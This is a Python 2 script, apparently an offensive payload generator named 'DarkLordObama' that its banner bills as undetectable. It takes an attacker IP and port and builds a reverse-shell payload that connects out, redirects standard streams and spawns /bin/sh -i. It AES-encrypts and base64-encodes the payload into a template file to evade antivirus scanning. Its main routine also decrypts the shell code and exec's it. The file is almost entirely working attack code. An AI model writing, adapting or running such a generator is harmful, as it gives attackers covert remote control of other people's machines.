#!/usr/bin/python
# -*- coding: utf-8 -*-

# Author: Chang Tan Lister
# Product of Lister Unlimited Cybersecurity Solutions, LLC
# 702-886-8952

import re,random,string,Crypto,binascii,base64,sys,os,time,subprocess
from Crypto.Cipher import AES
from binascii import hexlify
from base64 import b64decode, b64encode


arrayList = []
def fillList(arrayBrokenShellCode,toFill):
    for i in range(0,toFill):
        arrayBrokenShellCode.append("aa")
    return arrayBrokenShellCode
def generateArrayList(l):
    arrayBrokenShellCode = re.findall('..?',l)
    arrayBSOrig = list(arrayBrokenShellCode)
    toFill = 50 - len(arrayBrokenShellCode)
    arrayBrokenShellCode = fillList(arrayBrokenShellCode,toFill)
    arrayShuffled = random.sample(arrayBrokenShellCode,len(arrayBrokenShellCode))
    for i in arrayShuffled:
        if i == 'aa' or None:
            char = ''.join(random.choice(string.ascii_lowercase) for i in range(2))
            arrayShuffled[arrayShuffled.index(i)] = char
    return arrayShuffled,arrayBSOrig
scmap = []
def remap(arrayBSOrig,arrayShuffled):
    for word in arrayBSOrig:
        mapped = arrayShuffled.index(word)
        scmap.append(mapped)
    return scmap
def reconstituteSC(arrayShuffled,scmap):
    cmd=""
    for index in scmap:
        cmd += arrayShuffled[index]
    cmd = cmd.strip().rstrip()
    # print "Executing Command:\r\n{}".format(str(cmd))
    exec(cmd)
    return cmd

def reconstituteOrig(arrayBSOrig):
    shell=[]
    for x in arrayBSOrig:
        cmd = ""
        try:
            cmd = "".join(x)
            shell.append(cmd)
        except:
            pass
    # print shell
    for c in shell:
        cmd = c
        # print "Executing Command:\r\n{}".format(str(cmd))
        exec(cmd)
    return

def generateKey(size=32,chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for x in range(size))

def generateIV(size=16,chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for x in range(size))
def cryptor(shellcommands, key, IV):
    obj = AES.new(key,AES.MODE_CFB,IV)
    ciphertext = obj.encrypt(shellcommands)

    return ciphertext

def safeDecryptShellCommands(ciphertext, key, IV):
    obj3 = AES.new(key,AES.MODE_CFB,IV)
    plainTextCmd = obj3.decrypt(ciphertext)

    return plainTextCmd

def writePayloadToFile(l_encrypted):
    out = l_encrypted
    payload = 'payload.txt'
    w = open(payload,'w+')
    w.write(out)
    w.close()

    return payload

def executeEncryptedPayload(payload,decryptKey,decryptIV):
    r = open(payload,'r+')
    cryptedPayload = r.read()
    r.close()
    x = safeDecryptShellCommands(cryptedPayload,decryptKey,decryptIV)
    lines = x.splitlines()

    return lines

# Startup
banner = """
# DarkLordObama: Undetectable (as of July 28th, 2019) Pythonic Payload Generator
# Author: Chang Tan Lister
# Product of Lister Unlimited Cybersecurity Solutions, LLC
# Services provided: Low-interest loans to Cybersecurity/IT Companies, Securities-Trading (Corporate Bonds), Penetration Tests, Cyber Liability Coverage Plans (Requires pentest before a quote can be devised)
# 702-886-8952
"""
print banner
if len(sys.argv) < 3:
    print "Usage\r\npython generator.py <IPAddr> <Port>"
    exit(0)
else:
    LHOST=str(sys.argv[1])
    LPORT=int(sys.argv[2])

template_reverse_shell = """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{}",{}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
""".format(
    str(LHOST),
    int(LPORT)
)
timestr = time.strftime("%Y%m%d-%H%M%S")
payload2="darklordobama_{}.py".format(str(timestr))
template_reverse_shell = template_reverse_shell.strip().rstrip()

def writeUniquePayload(code,l_encrypted,decryptKey,decryptIV,outfile=payload2):
    cmd = "touch {}".format(str(outfile))
    subprocess.call(cmd,shell=True,executable='/bin/bash')
    out = b64encode(l_encrypted)
    w = open(outfile,'wb+')
    c = code.splitlines()
    for line in c:
        # Add unique key
        if 'key=' in line:
            kline = 'key="""{}"""'.format(str(decryptKey))
            line = line.replace('key=',kline)
        # Add unique Initialization Vector
        if 'iv=' in line:
            ivline = 'iv="""{}"""'.format(str(decryptIV))
            line = line.replace('iv=',ivline)
        # Add unique Encrypted Payload
        if 'pld=' in line:
            pldline1 = 'pld=str("""'
            pldline2 = "{}".format(str(out))
            pldline3 = '""")'
            pldline = """
{}
{}
{}
            """.format(
                str(pldline1),
                str(pldline2),
                str(pldline3)
            )
            line = line.replace('pld=',pldline)
        # Write all lines whether or not they need to be rewritten
        w.write('\r\n'+line)
    # Save the file as outfile.py
    w.close()
    cmd = "ls $PWD/{}".format(str(outfile))
    of = subprocess.Popen(cmd,shell=True,executable='/bin/bash',stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    ofile = str(of.stdout.read().encode('utf-8')).strip().rstrip()
    # cmd = "pyobfuscate {0} 2>&1 | tee {0}_payload.py;rm {0}".format(str(ofile))
    print "Payload saved at:\r\n{}".format(str(ofile))
    return outfile
def read_template(template="./payload_template.py"):
    r = open(template,'rb+')
    code = r.read()
    r.close()
    return code
def main():
    decryptKey = generateKey()
    decryptIV = generateIV()
    code = read_template()
    l_encrypted = cryptor(template_reverse_shell,decryptKey,decryptIV)
    outfile = writeUniquePayload(code,l_encrypted,decryptKey,decryptIV,outfile=payload2)
    payload = writePayloadToFile(l_encrypted)
    out = b64encode(l_encrypted)
    # print "DEBUG:\r\n{}".format(str(out))
    lines = executeEncryptedPayload(payload,decryptKey,decryptIV)
    # print "DEBUG:\r\n{}".format(str(lines))

    for l in lines:
        arrayShuffled, arrayBSOrig = generateArrayList(l)
        scmap = remap(arrayBSOrig,arrayShuffled)

        for l in lines:
            array = re.findall('..?',l)
            # print array
            cmd = "".join(array)
            # print "Reconstituted:\r\n",cmd
            exec(cmd)
    return
main()
